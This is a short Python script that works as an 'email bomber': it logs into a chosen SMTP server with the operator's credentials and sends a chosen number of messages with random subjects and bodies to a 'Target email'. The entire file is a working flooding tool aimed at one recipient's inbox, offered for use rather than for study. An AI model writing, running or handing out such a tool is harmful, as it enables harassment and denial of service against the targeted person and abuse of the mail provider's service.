from email.message import EmailMessage
import smtplib,getpass,string,random,os

def subject():
    while True:
        words = string.ascii_letters
        sub = []

        for x in range(10):
            sub.append(random.choice(words))

        return "".join(sub)

def test_email_pass(mail,pas,smtp,port):
    try:
        server = smtplib.SMTP(smtp,port)
        server.starttls()
        server.login(mail,pas)
        return True
    except:
        return False

def email_bomber(email,password,reciever_email,number,smtp,port):
    if test_email_pass(email,password,smtp,port) == True:
        s = smtplib.SMTP(smtp, port)
        s.starttls()
        s.login(email, password)
        z = 0 
        for i in range(number):
            msg = EmailMessage()
            msg["From"] = email
            msg["Subject"] = subject()
            msg["To"] = reciever_email
            msg.set_content(subject())
            s.send_message(msg)
            print(f'{z} Emails sent successfully',end='\r')
            z += 1

if __name__ == '__main__':
    while True:
        smtp = input('SMTP: ')
        port = int(input('PORT: '))
        con = input('Your email: ')
        if '@' not in con:
            print('invalid email')
            continue
        else:
            con1 = getpass.getpass('Your password: ')
            if test_email_pass(con,con1,smtp,port) == True:
                while True:
                    con2 = input('Target email: ')
                    if '@' not in con2:
                        print('invalid email')
                        continue
                    else:
                        con3 = int(input('Number of times: '))
                        email_bomber(con,con1,con2,con3,smtp,port)
                        os.system('cls')
                        print('Done ')
                        break
            else:
                print("ERROR 404:couldn't login please check smtp server or email/password ")
                continue
            break